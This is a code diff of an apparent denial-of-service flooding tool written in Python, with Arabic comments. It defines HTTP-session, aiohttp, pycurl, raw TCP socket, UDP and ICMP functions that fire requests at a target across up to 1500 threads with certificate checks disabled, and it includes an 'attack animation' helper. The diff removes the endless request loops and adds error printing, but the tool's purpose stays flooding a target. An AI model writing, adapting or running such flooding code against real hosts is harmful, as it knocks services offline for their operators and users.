@@ -33,71 +33,64 @@ def send_requests_threaded(target, stop_flag):
     session = requests.Session()
 
     def send_request():
-        while not stop_flag.value:
-            try:
-                session.get(target, timeout=5, verify=False)
-            except:
-                pass
+        try:
+            session.get(target, timeout=5, verify=False)
+        except Exception as e:
+            print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
 
     num_threads = 1500  # استخدام 1500 خيط كحد أقصى
     with ThreadPoolExecutor(max_workers=num_threads) as executor:
         futures = [executor.submit(send_request) for _ in range(num_threads)]
-        
+
         for future in futures:
             if stop_flag.value:
                 break
 
 async def send_requests_aiohttp(target, stop_flag):
     async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
-        while not stop_flag.value:
-            try:
-                async with session.get(target, timeout=5) as response:
-                    await response.text()
-            except:
-                pass
+        try:
+            async with session.get(target, timeout=5) as response:
+                await response.text()
+        except Exception as e:
+            print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
 
 def send_requests_pycurl(target, stop_flag):
-    while not stop_flag.value:
+    try:
         buffer = BytesIO()
         c = pycurl.Curl()
         c.setopt(c.URL, target)
         c.setopt(c.WRITEDATA, buffer)
         c.setopt(c.SSL_VERIFYPEER, 0)
         c.setopt(c.SSL_VERIFYHOST, 0)
-        try:
-            c.perform()
-        except:
-            pass
-        finally:
-            c.close()
+        c.perform()
+        c.close()
+    except Exception as e:
+        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
 
 def send_requests_socket(target, stop_flag):
-    while not stop_flag.value:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((target, 443))
-            sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
-            sock.close()
-        except:
-            pass
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((target, 443))
+        sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
+        sock.close()
+    except Exception as e:
+        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
 
 def send_requests_udp(target, stop_flag):
-    while not stop_flag.value:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.sendto(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n", (target, 443))
-            sock.close()
-        except:
-            pass
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n", (target, 443))
+        sock.close()
+    except Exception as e:
+        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
 
 def send_requests_icmp(target, stop_flag):
-    while not stop_flag.value:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-            sock.sendto(b"\x08\x00\x00\x00\x00\x00\x00\x00", (target, 0))
-            sock.close()
-        except:
-            pass
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+        sock.sendto(b"\x08\x00\x00\x00\x00\x00\x00\x00", (target, 0))
+        sock.close()
+    except Exception as e:
+        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
 
 def show_attack_animation():
     print("Loading...")
